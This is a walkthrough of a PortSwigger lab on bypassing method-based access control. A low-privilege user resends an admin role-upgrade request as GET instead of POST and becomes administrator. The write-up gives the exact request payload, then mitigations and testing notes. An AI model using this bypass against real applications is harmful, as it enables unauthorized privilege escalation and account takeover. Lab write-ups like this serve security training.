# Method-based access control can be circumvented

**Source:** [PortSwigger](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)  
**Category:** Access control  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Vulnerability
This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

## Exploitation

### Steps

1. Log in as `administrator:admin` and explore the admin panel, including analyzing requests in Burp Suite.

2. In the `Admin panel` there is a form to upgrade or downgrade users. Submit the upgrade form for the administrator and intercept the request:

```http
POST /admin-roles HTTP/2
[...]
username=administrator&action=upgrade
```

3. Log in as `wiener:peter`, go to `/admin-roles` and send the request:

```http
POST /admin-roles HTTP/2
[...]
username=wiener&action=upgrade
```

Response: `"Unauthorized"`

4. Attempt to send the request via browser URL:

`/admin-roles?username=wiener&action=upgrade`

Success - user `wiener` promoted to administrator.

### Payload

`GET /admin-roles?username=wiener&action=upgrade HTTP/2`

### Shortcut

1. Log in as `administrator:admin` to find endpoint `/admin-roles` with `username` and `action=upgrade` parameters.
2. Log in as `wiener:peter`.
3. Send GET `/admin-roles?username=wiener&action=upgrade`.

## Impact
Attacker with a regular account can promote themselves or others to administrator, leading to full account takeover and privilege escalation.

## Mitigation

1. Apply consistent access control checks for all HTTP methods.
2. Implement role-based access control (RBAC) centrally.
3. Whitelist allowed methods per endpoint (e.g., only POST for `/admin-roles`).
4. Use POST with body data for sensitive operations, not URL parameters.

## Tools

- Burp Suite

## Notes

- Server blocked POST but allowed GET with same parameters.
- Access control was only checked for POST method - common mistake.
- Always test all HTTP methods: GET, POST, PUT, PATCH, DELETE, TRACE, OPTIONS, and headers like X-HTTP-Method-Override.